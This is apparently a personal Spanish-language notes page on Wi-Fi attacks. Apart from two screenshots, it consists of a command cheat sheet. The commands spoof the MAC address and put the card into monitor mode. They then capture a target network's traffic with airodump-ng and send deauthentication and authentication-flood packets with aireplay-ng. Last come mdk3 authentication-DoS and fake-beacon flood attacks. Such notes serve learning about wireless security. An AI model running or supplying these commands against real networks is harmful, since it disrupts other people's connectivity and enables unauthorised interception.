---
title: "Wi-fi"
description: ""
pubDate: "May 12 2023"
heroImage: "/asd.png"
slug: "wi/fi"
---

### Frecuencies

<img src='https://res.cloudinary.com/djc1umong/image/upload/v1685504598/Screenshot_from_2023-05-30_23-42-53_qued87.png' />

<img src='https://res.cloudinary.com/djc1umong/image/upload/v1685504739/Screenshot_from_2023-05-30_23-45-31_akzecv.png' />

```bash
## cambiar nuestro mac para camuflarse
macchanger -h
sudo airmon-ng check
sudo airmon-ng check kill

ifconfig wlan0 down

iwconfig wlan0

ifconfig wlan0 up

# creamos la interfaz mon0 a partir de wlan0
iw dev wlan0 interface add mon0 type monitor

#########################################
sudo ip link set wlp1s0 down
#sudo iw wlp1s0 set monitor none
#;sudo iw wlp1s0 set type managed
;sudo iw wlp1s0 set type monitor
sudo ip link set wlp1s0 up
###########################

ifconfig mon0 up

# monitoreamos toda la red
airodump-ng wlan0

# Monitoreamos la red mac_address por el canal 36 usando la red wlan0
airodump-ng --bssid mac_address -c 36 wlan0 -w captura.txt

# Enviamos paquetes de deactentication
aireplay-ng -0 15 -a mac_address -c device_address_station wlan0

## ataque de authenticacion para saturar
aireplay-ng -1 0 -a mac_address -h device_address_station_random wlan0

# Enviar usuaruois de one
mdk3 wlan0 a -a mac_address

## Ataque 3 de beacons meter usuarios a la red wifi
# usando wlan0 ataque b con el archivo redes.txt -a wpa2 cada segundo x el canal 11
# cat redes.txt
# network1
# network2
# network3

mdk3 wlan0 b -f redes.txt -a -s 1000 -c 11

```